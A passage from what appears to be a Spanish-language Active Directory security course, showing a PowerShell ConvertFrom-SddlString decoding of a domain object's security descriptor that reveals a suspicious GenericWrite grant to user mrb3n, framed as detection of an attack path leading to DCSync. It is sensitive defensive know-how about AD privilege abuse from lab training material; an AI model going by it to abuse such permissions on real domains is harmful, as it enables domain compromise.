7-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" 

Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
                   WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), INLANEFREIGHT\Domain Users:
                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
                   (Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

Si elegimos filtrar en la propiedad `DiscretionaryAcl`, podemos ver que la modificación probablemente estaba otorgando al usuario `mrb3n` privilegios `GenericWrite` sobre el objeto de dominio en sí, lo que podría ser indicativo de un intento de ataque.

```r
PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" |select -ExpandProperty DiscretionaryAcl

Everyone: AccessDenied (WriteData)
Everyone: AccessAllowed (WriteExtendedAttributes)
NT AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, Traverse, WriteExtendedAttributes)
NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\Authenticated Users: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)
BUILTIN\Pre-Windows 2000 Compatible Access: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\Domain Admins: AccessAllowed (ChangePermissions, CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)
INLANEFREIGHT\Enterprise Admins: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
INLANEFREIGHT\Organization Management: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\Exchange Trusted Subsystem: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\mrb3n: AccessAllowed (CreateDirectories, GenericExecute, GenericWrite, ReadExtendedAttributes, ReadPermissions, Traverse, WriteExtendedAttributes)
```

Hay muchas herramientas disponibles que pueden ser utilizadas para ayudar a monitorear AD. Estas herramientas, cuando se usan en conjunto con una postura de seguridad de AD altamente madura, y combinadas con herramientas integradas como las diversas formas en que podemos monitorear y alertar sobre eventos en Active Directory, pueden ayudar a detectar estos tipos de ataques y prevenir que vayan más allá.

En la siguiente sección, repasaremos el ataque DCSync, que es el resultado de la ruta de ataque que acabamos de trabajar y es una forma común de lograr la violación del dominio.